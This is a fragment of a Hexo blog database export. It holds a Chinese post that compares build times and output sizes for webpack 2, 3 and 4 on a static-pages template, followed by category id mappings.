测试配置\n\n很棒的是webpack即便大版本升级，loaders也都能前后兼容。只需要增加 **mode** 等少量webpack的配置，即可使用最新版 *4.1.0*\n\n完整的配置文件：[webpack.config.js](https://github.com/joaner/webpack-static-pages-template/blob/master/webpack.config.js)\n\n```\nmodule.exports = {\n  // only for webpack 4\n  mode: 'production',\n\n  // also includes css/js\n  entry: {\n    home: './pages/index.html',\n    about: './pages/about.html',\n    contact: './pages/contact.pug',\n  },\n\n  module: {\n    rules: [\n      // ... loaders\n    ],\n  },\n}\n```\n\n## 测试结果\n\n### 2.6.1 : 2080ms\n\n```\nVersion: webpack 2.6.1\nTime: 2080ms\n                   Asset       Size  Chunks                    Chunk Names\nassets/global.89c970.css   69 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n              index.html  529 bytes          [emitted]\n            contact.html  386 bytes          [emitted]\n imgs/webpack.f78661.png     368 kB          [emitted]  [big]\n              contact.js    2.71 kB       0  [emitted]         contact\n                 home.js    2.71 kB       1  [emitted]         home\n                about.js    2.71 kB       2  [emitted]         about\n```\n\n### 3.11.0 : 1445ms\n\n```\nVersion: webpack 3.11.0\nTime: 1445ms\n                   Asset       Size  Chunks                    Chunk Names\n              index.html  529 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\nassets/global.89c970.css   69 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n            contact.html  386 bytes          [emitted]\n imgs/webpack.f78661.png     368 kB          [emitted]  [big]\n              contact.js    2.55 kB       0  [emitted]         contact\n                 home.js    2.55 kB       1  [emitted]         home\n                about.js    2.55 kB       2  [emitted]         about\n```\n\n### 4.1.0 : 1087ms\n\n```\nVersion: webpack 4.1.0\nTime: 1087ms\nBuilt at: 2018-3-7 00:14:55\n                   Asset       Size  Chunks                    Chunk Names\n            contact.html  386 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\nassets/global.89c970.css   69 bytes          [emitted]\n              index.html  529 bytes          [emitted]\n imgs/webpack.f78661.png    360 KiB          [emitted]  [big]\n              contact.js  575 bytes       0  [emitted]         contact\n                about.js  574 bytes       1  [emitted]         about\n                 home.js  575 bytes       2  [emitted]         home\n```\n\n## 总结\n\n除了打包的速度提升30%，生成的入口js文件，也缩减了2KB。\n\n这次打包的内容算比较少，相比vue/react等重量上有很大差异，所以结果不具有代表性。\n","source":"_posts/webpack4-performance-test.md","raw":"---\ntitle: webpack4性能小测试\ndate: 2018-03-07 00:16:29\ntags:\n---\n\n之前写了个用webpack打包静态页面的项目：[webpack-static-pages-template](https://github.com/joaner/webpack-static-pages-template)\n\n最近webpack4已经正式发布了，对2/3/4版本做了性能测试，每个版本都有不错的速度提升。\n\n## 测试配置\n\n很棒的是webpack即便大版本升级，loaders也都能前后兼容。只需要增加 **mode** 等少量webpack的配置，即可使用最新版 *4.1.0*\n\n完整的配置文件：[webpack.config.js](https://github.com/joaner/webpack-static-pages-template/blob/master/webpack.config.js)\n\n```\nmodule.exports = {\n  // only for webpack 4\n  mode: 'production',\n\n  // also includes css/js\n  entry: {\n    home: './pages/index.html',\n    about: './pages/about.html',\n    contact: './pages/contact.pug',\n  },\n\n  module: {\n    rules: [\n      // ... loaders\n    ],\n  },\n}\n```\n\n## 测试结果\n\n### 2.6.1 : 2080ms\n\n```\nVersion: webpack 2.6.1\nTime: 2080ms\n                   Asset       Size  Chunks                    Chunk Names\nassets/global.89c970.css   69 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n              index.html  529 bytes          [emitted]\n            contact.html  386 bytes          [emitted]\n imgs/webpack.f78661.png     368 kB          [emitted]  [big]\n              contact.js    2.71 kB       0  [emitted]         contact\n                 home.js    2.71 kB       1  [emitted]         home\n                about.js    2.71 kB       2  [emitted]         about\n```\n\n### 3.11.0 : 1445ms\n\n```\nVersion: webpack 3.11.0\nTime: 1445ms\n                   Asset       Size  Chunks                    Chunk Names\n              index.html  529 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\nassets/global.89c970.css   69 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n            contact.html  386 bytes          [emitted]\n imgs/webpack.f78661.png     368 kB          [emitted]  [big]\n              contact.js    2.55 kB       0  [emitted]         contact\n                 home.js    2.55 kB       1  [emitted]         home\n                about.js    2.55 kB       2  [emitted]         about\n```\n\n### 4.1.0 : 1087ms\n\n```\nVersion: webpack 4.1.0\nTime: 1087ms\nBuilt at: 2018-3-7 00:14:55\n                   Asset       Size  Chunks                    Chunk Names\n            contact.html  386 bytes          [emitted]\n              about.html  116 bytes          [emitted]\n   assets/time.208f6e.js  161 bytes          [emitted]\nassets/global.89c970.css   69 bytes          [emitted]\n              index.html  529 bytes          [emitted]\n imgs/webpack.f78661.png    360 KiB          [emitted]  [big]\n              contact.js  575 bytes       0  [emitted]         contact\n                about.js  574 bytes       1  [emitted]         about\n                 home.js  575 bytes       2  [emitted]         home\n```\n\n## 总结\n\n除了打包的速度提升30%，生成的入口js文件，也缩减了2KB。\n\n这次打包的内容算比较少，相比vue/react等重量上有很大差异，所以结果不具有代表性。\n","slug":"webpack4-performance-test","published":1,"updated":"2018-03-06T16:52:14.482Z","_id":"cjefuwz5k0001l0lmfpwc7ctf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>之前写了个用webpack打包静态页面的项目：<a href=\"https://github.com/joaner/webpack-static-pages-template\" target=\"_blank\" rel=\"noopener\">webpack-static-pages-template</a></p>\n<p>最近webpack4已经正式发布了，对2/3/4版本做了性能测试，每个版本都有不错的速度提升。</p>\n<h2 id=\"测试配置\"><a href=\"#测试配置\" class=\"headerlink\" title=\"测试配置\"></a>测试配置</h2><p>很棒的是webpack即便大版本升级，loaders也都能前后兼容。只需要增加 <strong>mode</strong> 等少量webpack的配置，即可使用最新版 <em>4.1.0</em></p>\n<p>完整的配置文件：<a href=\"https://github.com/joaner/webpack-static-pages-template/blob/master/webpack.config.js\" target=\"_blank\" rel=\"noopener\">webpack.config.js</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  // only for webpack 4</span><br><span class=\"line\">  mode: &apos;production&apos;,</span><br><span class=\"line\"></span><br><span class=\"line\">  // also includes css/js</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    home: &apos;./pages/index.html&apos;,</span><br><span class=\"line\">    about: &apos;./pages/about.html&apos;,</span><br><span class=\"line\">    contact: &apos;./pages/contact.pug&apos;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      // ... loaders</span><br><span class=\"line\">    ],</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"测试结果\"><a href=\"#测试结果\" class=\"headerlink\" title=\"测试结果\"></a>测试结果</h2><h3 id=\"2-6-1-2080ms\"><a href=\"#2-6-1-2080ms\" class=\"headerlink\" title=\"2.6.1 : 2080ms\"></a>2.6.1 : 2080ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 2.6.1</span><br><span class=\"line\">Time: 2080ms</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png     368 kB          [emitted]  [big]</span><br><span class=\"line\">              contact.js    2.71 kB       0  [emitted]         contact</span><br><span class=\"line\">                 home.js    2.71 kB       1  [emitted]         home</span><br><span class=\"line\">                about.js    2.71 kB       2  [emitted]         about</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-11-0-1445ms\"><a href=\"#3-11-0-1445ms\" class=\"headerlink\" title=\"3.11.0 : 1445ms\"></a>3.11.0 : 1445ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 3.11.0</span><br><span class=\"line\">Time: 1445ms</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png     368 kB          [emitted]  [big]</span><br><span class=\"line\">              contact.js    2.55 kB       0  [emitted]         contact</span><br><span class=\"line\">                 home.js    2.55 kB       1  [emitted]         home</span><br><span class=\"line\">                about.js    2.55 kB       2  [emitted]         about</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-1-0-1087ms\"><a href=\"#4-1-0-1087ms\" class=\"headerlink\" title=\"4.1.0 : 1087ms\"></a>4.1.0 : 1087ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 4.1.0</span><br><span class=\"line\">Time: 1087ms</span><br><span class=\"line\">Built at: 2018-3-7 00:14:55</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png    360 KiB          [emitted]  [big]</span><br><span class=\"line\">              contact.js  575 bytes       0  [emitted]         contact</span><br><span class=\"line\">                about.js  574 bytes       1  [emitted]         about</span><br><span class=\"line\">                 home.js  575 bytes       2  [emitted]         home</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>除了打包的速度提升30%，生成的入口js文件，也缩减了2KB。</p>\n<p>这次打包的内容算比较少，相比vue/react等重量上有很大差异，所以结果不具有代表性。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前写了个用webpack打包静态页面的项目：<a href=\"https://github.com/joaner/webpack-static-pages-template\" target=\"_blank\" rel=\"noopener\">webpack-static-pages-template</a></p>\n<p>最近webpack4已经正式发布了，对2/3/4版本做了性能测试，每个版本都有不错的速度提升。</p>\n<h2 id=\"测试配置\"><a href=\"#测试配置\" class=\"headerlink\" title=\"测试配置\"></a>测试配置</h2><p>很棒的是webpack即便大版本升级，loaders也都能前后兼容。只需要增加 <strong>mode</strong> 等少量webpack的配置，即可使用最新版 <em>4.1.0</em></p>\n<p>完整的配置文件：<a href=\"https://github.com/joaner/webpack-static-pages-template/blob/master/webpack.config.js\" target=\"_blank\" rel=\"noopener\">webpack.config.js</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  // only for webpack 4</span><br><span class=\"line\">  mode: &apos;production&apos;,</span><br><span class=\"line\"></span><br><span class=\"line\">  // also includes css/js</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    home: &apos;./pages/index.html&apos;,</span><br><span class=\"line\">    about: &apos;./pages/about.html&apos;,</span><br><span class=\"line\">    contact: &apos;./pages/contact.pug&apos;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      // ... loaders</span><br><span class=\"line\">    ],</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"测试结果\"><a href=\"#测试结果\" class=\"headerlink\" title=\"测试结果\"></a>测试结果</h2><h3 id=\"2-6-1-2080ms\"><a href=\"#2-6-1-2080ms\" class=\"headerlink\" title=\"2.6.1 : 2080ms\"></a>2.6.1 : 2080ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 2.6.1</span><br><span class=\"line\">Time: 2080ms</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png     368 kB          [emitted]  [big]</span><br><span class=\"line\">              contact.js    2.71 kB       0  [emitted]         contact</span><br><span class=\"line\">                 home.js    2.71 kB       1  [emitted]         home</span><br><span class=\"line\">                about.js    2.71 kB       2  [emitted]         about</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-11-0-1445ms\"><a href=\"#3-11-0-1445ms\" class=\"headerlink\" title=\"3.11.0 : 1445ms\"></a>3.11.0 : 1445ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 3.11.0</span><br><span class=\"line\">Time: 1445ms</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png     368 kB          [emitted]  [big]</span><br><span class=\"line\">              contact.js    2.55 kB       0  [emitted]         contact</span><br><span class=\"line\">                 home.js    2.55 kB       1  [emitted]         home</span><br><span class=\"line\">                about.js    2.55 kB       2  [emitted]         about</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-1-0-1087ms\"><a href=\"#4-1-0-1087ms\" class=\"headerlink\" title=\"4.1.0 : 1087ms\"></a>4.1.0 : 1087ms</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Version: webpack 4.1.0</span><br><span class=\"line\">Time: 1087ms</span><br><span class=\"line\">Built at: 2018-3-7 00:14:55</span><br><span class=\"line\">                   Asset       Size  Chunks                    Chunk Names</span><br><span class=\"line\">            contact.html  386 bytes          [emitted]</span><br><span class=\"line\">              about.html  116 bytes          [emitted]</span><br><span class=\"line\">   assets/time.208f6e.js  161 bytes          [emitted]</span><br><span class=\"line\">assets/global.89c970.css   69 bytes          [emitted]</span><br><span class=\"line\">              index.html  529 bytes          [emitted]</span><br><span class=\"line\"> imgs/webpack.f78661.png    360 KiB          [emitted]  [big]</span><br><span class=\"line\">              contact.js  575 bytes       0  [emitted]         contact</span><br><span class=\"line\">                about.js  574 bytes       1  [emitted]         about</span><br><span class=\"line\">                 home.js  575 bytes       2  [emitted]         home</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>除了打包的速度提升30%，生成的入口js文件，也缩减了2KB。</p>\n<p>这次打包的内容算比较少，相比vue/react等重量上有很大差异，所以结果不具有代表性。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjef4yhui0006lzlmsdvn0iw0","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhuq000blzlm8g51p66v"},{"post_id":"cjef4yhu40000lzlmoi63jirt","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhus000elzlm3nvq8tuw"},{"post_id":"cjef4yhum0009lzlm18ypy09g","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhuv000glzlmn26kp3o5"},{"post_id":"cjef4yhub0002lzlm44woc8fj","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhuy000jlzlmcfqzudpj"},{"post_id":"cjef4yhuo000alzlmb7ku069d","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhv0000llzlm85l89yri"},{"post_id":"cjef4yhug0005lzlmuozivf3n","category_id":"cjef4yhuf0004lzlmya0hhdwv","_id":"cjef4yhv2000olzlmbf2p1ejm"},{"post_id":"cjef4yhuj0007lzlmfkizc18d","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhv4000rlzlmvo59guzy"},{"post_id":"cjef4yhur000dlzlm15kkys2j","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhv7000ulzlma2hut4u4"},{"post_id":"cjef4yhv4000slzlmn74ox8m2","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhv9000ylzlm26a2ad1a"},{"post_id":"cjef4yhut000flzlmbb5wgtjk","category_id":"cjef4yhv3000qlzlmvkobq8hx","_id":"cjef4yhva0011lzlmimzp2yt9"},{"post_id":"cjef4yhuw000ilzlmspa3lgx5","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhvd0014lzlm1f2i92km"},{"post_id":"cjef4yhv8000xlzlmskw0a3g5","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhve0016lzlmzg1ehjf8"},{"post_id":"cjef4yhva0010lzlm5ytoo0a5","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhvg0018lzlm3024r7jz"},{"post_id":"cjef4yhuz000klzlmrblv2gto","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhvh001blzlm94xhk9tk"},{"post_id":"cjef4yhvb0012lzlm71kp34l1","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhvi001dlzlm00x25xq3"},{"post_id":"cjef4yhvd0015lzlm3k0mjqna","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhvl001glzlmqfgtdkw8"},{"post_id":"cjef4yhvf0017lzlmjjtfxud9","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhvn001ilzlmgya5y4jo"},{"post_id":"cjef4yhv1000nlzlmqc7002nr","category_id":"cjef4yhvd0013lzlmn7dtnbz5","_id":"cjef4yhvq001llzlmxrvdzqua"},{"post_id":"cjef4yhvh001clzlmftdzlcb1","category_id":"cjef4yhvh001alzlmo075eiow","_id":"cjef4yhvr001nlzlmptuuvrt6"},{"post_id":"cjef4yhv2000plzlm65vltxx2","category_id":"cjef4yhvh001alzlmo075eiow","_id":"cjef4yhvu001qlzlm84kh2pno"},{"post_id":"cjef4yhvj001elzlm1q6f0r54","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhvw001slzlms0dh5v9v"},{"post_id":"cjef4yhvl001hlzlm5fax0dlc","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhvy001ulzlm36xauao3"},{"post_id":"cjef4yhv6000tlzlm26qtfh00","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhvz001xlzlmlpz1fx8p"},{"post_id":"cjef4yhvo001jlzlmmmvnugr3","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhw1001zlzlmy0m1seyg"},{"post_id":"cjef4yhvq001mlzlmpr8fvzcz","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhw30021lzlm49oqbcej"},{"post_id":"cjef4yhv7000wlzlm0mizqzbu","category_id":"cjef4yhvd0013lzlmn7dtnbz5","_id":"cjef4yhw40024lzlmelq3ypsk"},{"post_id":"cjef4yhvs001olzlmel0f2oof","category_id":"cjef4yhvh001alzlmo075eiow","_id":"cjef4yhw60026lzlmquj3dzg2"},{"post_id":"cjef4yhvu001rlzlmsz2tay3t","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhw70028lzlm1eaqkcxi"},{"post_id":"cjef4yhvg0019lzlmiq2xz09f","category_id":"cjef4yhvh001alzlmo075eiow","_id":"cjef4yhwb002alzlmv89vjfnn"},{"post_id":"cjef4yhvy001vlzlmsjyo79og","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhwc002clzlmrbdfhkev"},{"post_id":"cjef4yhw10020lzlmv39saetr","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhwe002elzlm2kqv4swt"},{"post_id":"cjef4yhvw001tlzlmd9xomrtl","category_id":"cjef4yhvz001wlzlmx514ai6y","_id":"cjef4yhwf002glzlm6z0af3c6"},{"post_id":"cjef4yhw30022lzlmwnwru4z7","category_id":"cjef4yhvd0013lzlmn7dtnbz5","_id":"cjef4yhwi002ilzlm64bvx8oo"},{"post_id":"cjef4yhw40025lzlmp0msg3qr","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhwl002klzlmaem9dhly"},{"post_id":"cjef4yhvz001ylzlme2usqwdj","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhwm002mlzlmzh56yt1x"},{"post_id":"cjef4yhvz001ylzlme2usqwdj","category_id":"cjef4yhw40023lzlmy2btjiab","_id":"cjef4yhwo002olzlm1l39bdfu"},{"post_id":"cjef4yhw60027lzlm8bgoxi2r","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhws002qlzlm8uyt73ov"},{"post_id":"cjef4yhw70029lzlmr6y7pbs6","category_id":"cjef4yhv7000vlzlmkfbhz92t","_id":"cjef4yhwu002slzlmrwc9iftf"},{"post_id":"cjef4yhwb002blzlmh2ljxz4y","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhww002ulzlmad5esj4g"},{"post_id":"cjef4yhwc002dlzlm3zpmptja","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhwy002wlzlm78vgkt45"},{"post_id":"cjef4yhwe002flzlm7xaqv4ln","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhwz002ylzlmw0l0ma03"},{"post_id":"cjef4yhwg002hlzlmcnuq00op","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx20031lzlmzg41zlm9"},{"post_id":"cjef4yhwi002jlzlmjjvhm4fp","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhx30033lzlmfi6v52e4"},{"post_id":"cjef4yhwl002llzlme8zwqd19","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx50035lzlmiaqav5h8"},{"post_id":"cjef4yhwl002llzlme8zwqd19","category_id":"cjef4yhw40023lzlmy2btjiab","_id":"cjef4yhx60037lzlmevcgkoyx"},{"post_id":"cjef4yhwm002nlzlmn5qaq1wj","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhx70038lzlmxkjr2flw"},{"post_id":"cjef4yhwp002plzlm1xtv2vzu","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx70039lzlmkvvpqbob"},{"post_id":"cjef4yhws002rlzlmwz4cavkg","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx8003alzlmc5fbcskr"},{"post_id":"cjef4yhwu002tlzlmtjmn58f2","category_id":"cjef4yhv3000qlzlmvkobq8hx","_id":"cjef4yhx8003blzlmgt22e2z0"},{"post_id":"cjef4yhww002vlzlmx877990o","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx8003clzlm13ohe9qc"},{"post_id":"cjef4yhwz002zlzlmj2hxxl1v","category_id":"cjef4yhv3000qlzlmvkobq8hx","_id":"cjef4yhx8003dlzlmcdhy48qs"},{"post_id":"cjef4yhx20032lzlm54mptayx","category_id":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhx8003elzlm5cu8op9u"},{"post_id":"cjef4yhx40034lzlmx65uupeo","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhx8003flzlm8pbcmowq"},{"post_id":"cjef4yhwy002xlzlmdvfnnj6s","category_id":"cjef4yhx20030lzlmhoayngjv","_id":"cjef4yhx9003glzlmionk54pf"},{"post_id":"cjef4yhx50036lzlmydcui508","category_id":"cjef4yhvl001flzlm0zm92wj6","_id":"cjef4yhx9003hlzlmc3l0zl4r"}],"PostTag":[],"Tag":[]}}